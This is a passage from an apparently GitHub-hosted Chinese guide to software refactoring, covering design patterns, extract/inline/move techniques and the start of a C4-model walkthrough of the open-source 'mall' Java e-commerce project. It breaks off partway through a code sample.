&lt;h3&gt;&lt;a id="user-content-领域特定语言" class="anchor" aria-hidden="true" href="#领域特定语言"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;领域特定语言&lt;/h3&gt;
&lt;h2&gt;&lt;a id="user-content-模式重构" class="anchor" aria-hidden="true" href="#模式重构"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;模式重构&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;模式是某种场合下对某个问题的一个解决方案的&lt;strong&gt;一种结构化展现&lt;/strong&gt;。 ——  Jon Vlissides（GoF 成员）《设计模式沉思录》&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;小步前进，拉一下最新的代码。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;不过，人们对于设计模式的看法就变成了砒霜，听上去有害，实际上真香。&lt;/p&gt;
&lt;p&gt;我不是想鼓励使用设计模式，只是呢，如开头所说，我想展示的是如何用它来提升代码的可读性。也因此，我们的第一个例子是，干掉反模式的设计模式。&lt;/p&gt;
&lt;p&gt;一旦你决定使用某种设计模式的时候，请确保&lt;strong&gt;团队的所有人知道它解决了什么问题？&lt;/strong&gt;&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-终止-singleton" class="anchor" aria-hidden="true" href="#终止-singleton"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;终止 Singleton&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;确保一个类只有一个实例，并提供一个全局访问点来访问该实例。—— 《设计模式：可复用面向对象软件的基础》&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;单例对象存活的时间通常很长，它们通常存在于程序的整个生命周期中。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-工厂封装复杂构建" class="anchor" aria-hidden="true" href="#工厂封装复杂构建"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;工厂封装复杂构建&lt;/h3&gt;
&lt;p&gt;工厂是领域驱动设计中的重要组件。&lt;/p&gt;
&lt;p&gt;工厂的目标：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;隐藏创建对象的复杂性&lt;/li&gt;
&lt;li&gt;减少对外暴露过多的内部结构&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;工厂模式是一种创建方法：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;工厂方法（factory method）&lt;/li&gt;
&lt;li&gt;抽象工厂（abstracty factory）&lt;/li&gt;
&lt;li&gt;建造者模式（builder）&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;值得注意的是：工厂并不总是需要独立的静态类。&lt;/p&gt;
&lt;p&gt;尝试使用 &lt;code&gt;coca suggest&lt;/code&gt; 会有惊喜。&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-重构手法" class="anchor" aria-hidden="true" href="#重构手法"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;重构手法&lt;/h4&gt;
&lt;p&gt;对应的手法是：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;提取构建步骤到新的构建方法中&lt;/li&gt;
&lt;li&gt;将构建步骤方法转为 static 方法&lt;/li&gt;
&lt;li&gt;将这个 static 方法移到工厂类中&lt;/li&gt;
&lt;li&gt;将旧的构建函数提取成工厂方法&lt;/li&gt;
&lt;li&gt;将提取的工厂方法移到类中&lt;/li&gt;
&lt;li&gt;内联原有的工厂使用方&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;&lt;a id="user-content-策略模式提供易变规则" class="anchor" aria-hidden="true" href="#策略模式提供易变规则"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;策略模式提供易变规则&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;我们需要把过程中的易变部分提取到模型的一个单独的『策略』对象中，将规则与它控制的行为分开。——《领域驱动设计：软件核心复杂性应对之道》&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;看标题，你懂的。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-建造者模式拆解复杂对象" class="anchor" aria-hidden="true" href="#建造者模式拆解复杂对象"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;建造者模式拆解复杂对象&lt;/h3&gt;
&lt;p&gt;看标题，你懂的。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-工具自动化识别" class="anchor" aria-hidden="true" href="#工具自动化识别"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;工具：自动化识别&lt;/h3&gt;
&lt;p&gt;如 Coca 提供的 &lt;code&gt;coca suggest&lt;/code&gt;功能，可以对相应的类提供一些建议，如：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;CLASS&lt;/th&gt;
&lt;th&gt;PATTERN&lt;/th&gt;
&lt;th&gt;REASON&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Insect&lt;/td&gt;
&lt;td&gt;factory&lt;/td&gt;
&lt;td&gt;too many constructor&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Bee&lt;/td&gt;
&lt;td&gt;factory, builder&lt;/td&gt;
&lt;td&gt;complex constructor, too many constructor, too many parameters&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2&gt;&lt;a id="user-content-代码重构" class="anchor" aria-hidden="true" href="#代码重构"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;代码重构&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;理想的方法长度不应该超过 4 行代码。—— Robert C Martin&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;常见的富血模型的类，往往包含了系统的行为。&lt;/p&gt;
&lt;p&gt;常见的原因是：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;缺乏抽象&lt;/li&gt;
&lt;li&gt;过程代码&lt;/li&gt;
&lt;li&gt;行为无法附着&lt;/li&gt;
&lt;li&gt;未来复用&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;从技巧上来说，主要是&lt;strong&gt;提取、内联与移动&lt;/strong&gt;，配合上 IDE 的重构功能和《重构：改善既有代码的设计》，那么剩下的事件就简单了。&lt;/p&gt;
&lt;p&gt;如果你缺乏这方面的技巧，欢迎与我们联系。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-降低圈复杂度" class="anchor" aria-hidden="true" href="#降低圈复杂度"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;降低圈复杂度&lt;/h3&gt;
&lt;p&gt;圈复杂度过大的代码，容易出问题。也因此呢，作为重构的第一步，只需要找一个工具，然后消除即可。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-手法提取" class="anchor" aria-hidden="true" href="#手法提取"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;手法：提取&lt;/h3&gt;
&lt;p&gt;提取分为：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;提取参数&lt;/li&gt;
&lt;li&gt;提取参数对象&lt;/li&gt;
&lt;li&gt;提取变量&lt;/li&gt;
&lt;li&gt;提取常量&lt;/li&gt;
&lt;li&gt;提取方法&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;&lt;a id="user-content-手法内联" class="anchor" aria-hidden="true" href="#手法内联"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;手法：内联&lt;/h3&gt;
&lt;p&gt;内联上的手法则是：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;内联参数&lt;/li&gt;
&lt;li&gt;内联变量&lt;/li&gt;
&lt;li&gt;内联常量&lt;/li&gt;
&lt;li&gt;内联方法&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;&lt;a id="user-content-手法移动" class="anchor" aria-hidden="true" href="#手法移动"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;手法：移动&lt;/h3&gt;
&lt;p&gt;移动的关键不在于&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-方法移至其它类中" class="anchor" aria-hidden="true" href="#方法移至其它类中"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;方法移至其它类中&lt;/h4&gt;
&lt;p&gt;这里的 Ctrl + T 对应于老式的 IDEA 快捷键 Ctrl + Alt + Shift + T&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;将函数转为静态方法，以解除对外的依赖（可选）（Static Method，Ctrl + T）&lt;/li&gt;
&lt;li&gt;将与函数职责无关的部分提取为函数的参数（Extract Functional Parameter，Ctrl + T）&lt;/li&gt;
&lt;li&gt;将函数的参数提取为参数对象（Extract Parameter Object，Ctrl + T）&lt;/li&gt;
&lt;li&gt;将函数移到参数对象中（Move Instance Method, F6）&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;完美。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-标准4-行的方法" class="anchor" aria-hidden="true" href="#标准4-行的方法"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;标准：4 行的方法&lt;/h3&gt;
&lt;p&gt;偶然间然《修改代码的艺术：构建易维护代码的 9 条最佳实践》上看到了那句：『理想的方法长度不应该超过 4 行代码』。&lt;/p&gt;
&lt;p&gt;所以，我找出了书架上的那本《代码整洁之道》，找到了出处 32 页。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;函数不该有 100 行那么长，20 行封顶最佳。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;然后就是 Kent Beck 的 Java/Swing 小程序四行的故事。&lt;/p&gt;
&lt;p&gt;但是，要保持一个好的习惯，寻找合适的机会去重构它。&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-重构示例" class="anchor" aria-hidden="true" href="#重构示例"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;重构示例&lt;/h2&gt;
&lt;p&gt;我正在寻找一个合适的项目来演示如何重构。事实上，我已经找到了一些，但是它们的复杂度不太适合在些教学，所以我正在努力简化出一个可用的版本。&lt;/p&gt;
&lt;p&gt;如果你已经迫不急待的话，可以尝试对以下的项目进行重构：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/shuzheng/zheng"&gt;https://github.com/shuzheng/zheng&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/macrozheng/mall"&gt;https://github.com/macrozheng/mall&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;它们是我在 GitHub 上找到的 Star 数相当多的开源 Java 项目，所以让我们来进行评估吧。&lt;/p&gt;
&lt;p&gt;这两个项目的作者在项目中展示了极高的专业性和原则性。无论怎么说，这都是“好代码”，我也并非出于恶意的目的。如果你看了我在 GitHub 上的项目，你也会对我有诸多吐槽。我所尝试去做的是，以专业眼光来检视问题，不多也不和。作为一个追求匠艺的手工艺人，我们应该欢迎别人对我们这么做。只有批评才能让我们学到更多的东西。在进一步的重构之前，我们要再一次感谢两位作者将代码免费给社区的勇气和信心。他们做得相当的好。&lt;/p&gt;
&lt;p&gt;相比之下，我大抵就只会复制和粘贴内容。&lt;/p&gt;
&lt;p&gt;开始之前，你大可以从 GitHub 上复制这两个项目的其中一个，然后这里的例子以 mall 为例。你可以将 zheng 作为你的练手项目。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-评估" class="anchor" aria-hidden="true" href="#评估"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;评估&lt;/h3&gt;
&lt;p&gt;这两个项目都有丰富的文档，足够让你搭建好它们的环境。事实上，我觉得你可能不需要这样的操作，你需要打开你的 Intellij IDEA，然后构建一下，就可以阅读代码了。&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-c4-模型展开" class="anchor" aria-hidden="true" href="#c4-模型展开"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;C4 模型展开&lt;/h4&gt;
&lt;p&gt;首先，让我们以 C4 模型来展开这个项目的代码。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;展开系统目录结构&lt;/strong&gt;。从目录结构上来看，mall 系统的组织相当的不错，按业务和通用模块进行了拆分。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;├── mall-common -- 工具类及通用代码
├── mall-mbg -- MyBatisGenerator生成的数据库操作代码
├── mall-security -- SpringSecurity封装公用模块
├── mall-admin -- 后台商城管理系统接口
├── mall-search -- 基于Elasticsearch的商品搜索系统
├── mall-portal -- 前台商城系统接口
└── mall-demo -- 框架搭建时的测试代码
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;展开其中的一个微服务&lt;/strong&gt;。这里以 mall 为例，这是典型的 controller-service-dao 架构：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;mall-admin
├── bo
├── component
├── config
├── controller
├── dao
├── dto
├── service
└── validator
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;而其中的 &lt;code&gt;home&lt;/code&gt; 包，又以&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;展开包架构&lt;/strong&gt;。接着，让我们看看 controller 包下的目录结构，这是按技术划分服务的架构模式：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;controller
...
├── SmsFlashPromotionController.java
├── SmsFlashPromotionProductRelationController.java
├── SmsFlashPromotionSessionController.java
├── SmsHomeAdvertiseController.java
├── SmsHomeBrandController.java
├── SmsHomeNewProductController.java
├── SmsHomeRecommendProductController.java
├── SmsHomeRecommendSubjectController.java
├── UmsAdminController.java
├── UmsMemberLevelController.java
├── UmsPermissionController.java
└── UmsRoleController.java
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;展开类&lt;/strong&gt;。接着，让我们查看一下 OmsOrderReturnApplyController.java 文件，看看最后的接口：&lt;/p&gt;
&lt;div class="highlight highlight-source-java"&gt;&lt;pre&gt;&lt;span class="pl-k"&gt;@ApiOperation&lt;/span&gt;(&lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;修改申请状态&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;)
&lt;span class="pl-k"&gt;@RequestMapping&lt;/span&gt;(&lt;span class="pl-c1"&gt;value&lt;/span&gt; &lt;span class="pl-k"&gt;=&lt;/span&gt; &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;/update/status/{id}&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;, &lt;span class="pl-c1"&gt;method&lt;/span&gt; &lt;span class="pl-k"&gt;=&lt;/span&gt; &lt;span class="pl-smi"&gt;RequestMethod&lt;/span&gt;&lt;span class="pl-c1"&gt;&lt;span class="pl-k"&gt;.&lt;/span&gt;POST&lt;/span&gt;)
&lt;span class="pl-k"&gt;@ResponseBody&lt;/span&gt;
&lt;span class="pl-k"&gt;public&lt;/span&gt; &lt;span class="pl-smi"&gt;CommonResult&lt;/span&gt; updateStatus(&lt;span class="pl-k"&gt;@PathVariable&lt;/span&gt; &lt;span class="pl-smi"&gt;Long&lt;/span&gt; id, &lt;span class="pl-k"&gt;@RequestBody&lt;/span&gt; &lt;span class="pl-smi"&gt;OmsUpdateStatusParam&lt;/span&gt; statusParam) {
    &lt;span class="pl-k"&gt;int&lt;/span&gt; count &lt;span class="pl-k"&gt;=&lt;/span&gt; returnApplyService&lt;span class="pl-k"&gt;.&lt;/span&gt;updateStatus(id, statusParam);
    &lt;span class="pl-k"&gt;if&lt;/span&gt; (count &lt;span class="pl-k"&gt;&amp;gt;&lt;/span&gt; &lt;span class="pl-c1"&gt;0&lt;/span&gt;) {
        &lt;span class="pl-k"&gt;return&lt;/span&gt; &lt;span class="pl-smi"&gt;CommonResult&lt;/span&gt;&lt;span class="pl-k"&gt;.&lt;/span&gt;success(count);
    }
    &lt;span class="pl-k"&gt;return&lt;/span&gt; &lt;span class="pl-smi"&gt;CommonResult&lt;/span&gt;&lt;span class="pl-k"&gt;.&lt;/span&gt;failed();
}&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;用 OmsUpdateStatusParam 封装了请求参数，这个实践相当的不错。&lt;/p&gt;
&lt;p&gt;接着，我们进入 &lt;code&gt;updateStatus&lt;/code&gt; 方法看看：&lt;/p&gt;
&lt;div class="highlight highlight-source-java"&gt;&lt;pre&gt;&lt;span class="pl-k"&gt;@Override&lt;/span&gt;
&lt;span class="pl-k"&gt;@Override&lt;/span&gt;
